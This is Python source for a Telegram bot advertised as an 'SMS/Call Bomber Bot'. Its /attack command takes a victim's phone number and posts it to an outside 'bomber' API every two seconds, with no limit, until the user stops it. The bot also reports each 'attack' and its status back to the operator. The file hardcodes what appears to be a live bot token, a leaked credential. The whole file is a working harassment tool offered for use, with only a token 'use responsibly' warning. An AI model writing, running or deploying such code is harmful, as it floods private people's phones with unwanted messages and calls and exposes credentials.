import json
import logging
import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackContext
from datetime import datetime
import signal
import sys

# ⚠️ YOUR BOT TOKEN HERE - Replace with your actual bot token
BOT_TOKEN = "8098475949:AAHZhzAivOXv2lN_GSSMjuP9hXSUHljStiY"

# Store active attacks
active_attacks = {}

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# API configuration
API_URL = "https://bomber-api-b65587ad9efc.herokuapp.com/start"
REQUEST_DELAY = 2  # 2 seconds delay

async def send_attack_request(phone_number, chat_id, context: CallbackContext):
    """Send request to bombing API and return response"""
    headers = {"Content-Type": "application/json"}
    data = {"phone": phone_number}
    
    try:
        response = requests.post(API_URL, headers=headers, data=json.dumps(data))
        
        # Prepare response message
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if response.status_code == 200:
            try:
                resp_json = response.json()
                message = f"✅ {timestamp}\n📞 Target: {phone_number}\nStatus: {response.status_code}\nResponse: {json.dumps(resp_json)}"
            except:
                message = f"✅ {timestamp}\n📞 Target: {phone_number}\nStatus: {response.status_code}\nText: {response.text[:200]}"
        else:
            message = f"⚠️ {timestamp}\n📞 Target: {phone_number}\nStatus: {response.status_code}\nError: {response.text[:200] if response.text else 'No response'}"
        
        # Send update to user
        await context.bot.send_message(chat_id=chat_id, text=message)
        
    except Exception as e:
        timestamp = datetime.now().strftime("%H:%M:%S")
        error_msg = f"❌ {timestamp}\n📞 Target: {phone_number}\nError: {str(e)}"
        await context.bot.send_message(chat_id=chat_id, text=error_msg)

async def attack_task(phone_number: str, chat_id: int, context: CallbackContext):
    """Continuous attack task"""
    logger.info(f"Starting attack on {phone_number} for chat {chat_id}")
    
    while True:
        # Check if attack is still active
        if chat_id not in active_attacks or active_attacks[chat_id].get('target') != phone_number:
            logger.info(f"Attack stopped for chat {chat_id}")
            break
        
        # Send request
        await send_attack_request(phone_number, chat_id, context)
        
        # Wait before next request
        await asyncio.sleep(REQUEST_DELAY)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_text(
        f"👋 Hello {user.first_name}!\n\n"
        f"Welcome to SMS/Call Bomber Bot\n\n"
        f"Available commands:\n"
        f"/start - Show this message\n"
        f"/attack [phone] - Start attack on phone number\n"
        f"/stop - Stop current attack\n"
        f"/status - Check attack status\n\n"
        f"⚠️ Warning: Use responsibly!"
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start attack on phone number"""
    chat_id = update.effective_chat.id
    
    # Check if already attacking
    if chat_id in active_attacks:
        await update.message.reply_text(
            f"⚠️ You already have an active attack on {active_attacks[chat_id]['target']}!\n"
            f"Use /stop to stop it first."
        )
        return
    
    # Get phone number from command
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide a phone number!\n"
            "Usage: /attack 8859027788"
        )
        return
    
    phone_number = context.args[0].strip()
    
    # Simple phone number validation
    if not phone_number.isdigit() or len(phone_number) < 10:
        await update.message.reply_text(
            "❌ Invalid phone number! Please provide a valid number."
        )
        return
    
    # Start attack
    active_attacks[chat_id] = {
        'target': phone_number,
        'start_time': datetime.now(),
        'task': None
    }
    
    await update.message.reply_text(
        f"🚀 Starting attack on: {phone_number}\n"
        f"⏱️ Delay: {REQUEST_DELAY} seconds\n"
        f"⚡ Continuous mode: ON\n\n"
        f"Type /stop to stop the attack\n"
        f"Type /status to check progress"
    )
    
    # Start attack task in background
    task = asyncio.create_task(attack_task(phone_number, chat_id, context))
    active_attacks[chat_id]['task'] = task

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    chat_id = update.effective_chat.id
    
    if chat_id not in active_attacks:
        await update.message.reply_text("❌ No active attack found!")
        return
    
    target = active_attacks[chat_id]['target']
    del active_attacks[chat_id]
    
    await update.message.reply_text(f"🛑 Attack stopped on: {target}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        attack_info = active_attacks[chat_id]
        duration = datetime.now() - attack_info['start_time']
        await update.message.reply_text(
            f"📊 Attack Status:\n"
            f"• Target: {attack_info['target']}\n"
            f"• Running for: {duration}\n"
            f"• Delay: {REQUEST_DELAY} seconds\n"
            f"• Status: ⚡ ACTIVE"
        )
    else:
        await update.message.reply_text("📊 No active attack running.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a help message"""
    await update.message.reply_text(
        "📚 Help Guide:\n\n"
        "/start - Start the bot\n"
        "/attack [phone] - Start attack\n"
        "Example: /attack 8859027788\n\n"
        "/stop - Stop attack\n"
        "/status - Check status\n"
        "/help - This message\n\n"
        "⚠️ Important:\n"
        "• Bot will send requests every 2 seconds\n"
        "• Use /stop to terminate attack\n"
        "• Only one attack per user"
    )

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Log errors caused by updates."""
    logger.error("Exception while handling an update:", exc_info=context.error)

def cleanup_attacks():
    """Clean up all active attacks before shutdown"""
    logger.info("Cleaning up active attacks...")
    for chat_id in list(active_attacks.keys()):
        if active_attacks[chat_id]['task']:
            active_attacks[chat_id]['task'].cancel()
        del active_attacks[chat_id]
    logger.info("All attacks stopped")

async def main():
    """Start the bot"""
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Register command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Register error handler
    application.add_error_handler(error_handler)
    
    # Setup signal handlers for graceful shutdown
    def signal_handler(signum, frame):
        logger.info("Received shutdown signal")
        cleanup_attacks()
        sys.exit(0)
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start the bot
    logger.info("Starting bot...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logger.info("Bot is running. Press Ctrl+C to stop.")
    
    # Keep running
    try:
        while True:
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass
    finally:
        # Clean shutdown
        cleanup_attacks()
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

if __name__ == '__main__':
    # ⚠️ IMPORTANT: Replace with your actual bot token
    # Get from @BotFather on Telegram
    BOT_TOKEN = "YOUR_ACTUAL_BOT_TOKEN_HERE"
    
    if BOT_TOKEN == "YOUR_ACTUAL_BOT_TOKEN_HERE":
        print("❌ ERROR: Please replace BOT_TOKEN with your actual bot token!")
        print("Get token from @BotFather on Telegram")
        sys.exit(1)
    
    # Run the bot
    asyncio.run(main())